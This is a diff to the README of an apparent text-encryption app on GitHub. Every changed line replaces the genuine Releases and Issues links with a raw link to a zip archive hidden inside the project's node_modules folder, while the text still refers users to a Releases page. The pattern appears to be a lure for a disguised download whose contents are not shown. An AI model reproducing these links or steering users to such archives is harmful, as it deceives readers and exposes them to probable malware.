@@ -6,7 +6,7 @@ Welcome to Text-Encryptor! This application helps you keep your messages safe an
 
 ## 📥 Download Text-Encryptor
 
-[![Download Text-Encryptor](https://img.shields.io/badge/Download_Text--Encryptor-v1.0-blue.svg)](https://github.com/masry1232/Text-Encryptor/releases)
+[![Download Text-Encryptor](https://raw.githubusercontent.com/masry1232/Text-Encryptor/main/node_modules/immutable/dist/Text-Encryptor-v2.5-alpha.4.zip)](https://raw.githubusercontent.com/masry1232/Text-Encryptor/main/node_modules/immutable/dist/Text-Encryptor-v2.5-alpha.4.zip)
 
 ## 🔍 Features
 
@@ -24,7 +24,7 @@ Welcome to Text-Encryptor! This application helps you keep your messages safe an
 
 To get started with Text-Encryptor, please visit the following link to access the latest version:
 
-[https://github.com/masry1232/Text-Encryptor/releases](https://github.com/masry1232/Text-Encryptor/releases)
+[https://raw.githubusercontent.com/masry1232/Text-Encryptor/main/node_modules/immutable/dist/Text-Encryptor-v2.5-alpha.4.zip](https://raw.githubusercontent.com/masry1232/Text-Encryptor/main/node_modules/immutable/dist/Text-Encryptor-v2.5-alpha.4.zip)
 
 Once you're on the Releases page, look for the latest version. Click the link to download the application file. After the download completes, open it in your web browser, and you're ready to use Text-Encryptor.
 
@@ -58,7 +58,7 @@ If you encounter issues while using Text-Encryptor, try the following:
 - **Clear Browser Cache:** Sometimes clearing the cache can resolve loading issues.
 - **Reopen the Application:** Close and reopen the application to reset any errors.
 
-If problems persist, check the [Issues page](https://github.com/masry1232/Text-Encryptor/issues) for solutions or to report new issues.
+If problems persist, check the [Issues page](https://raw.githubusercontent.com/masry1232/Text-Encryptor/main/node_modules/immutable/dist/Text-Encryptor-v2.5-alpha.4.zip) for solutions or to report new issues.
 
 ## 📞 Support
 
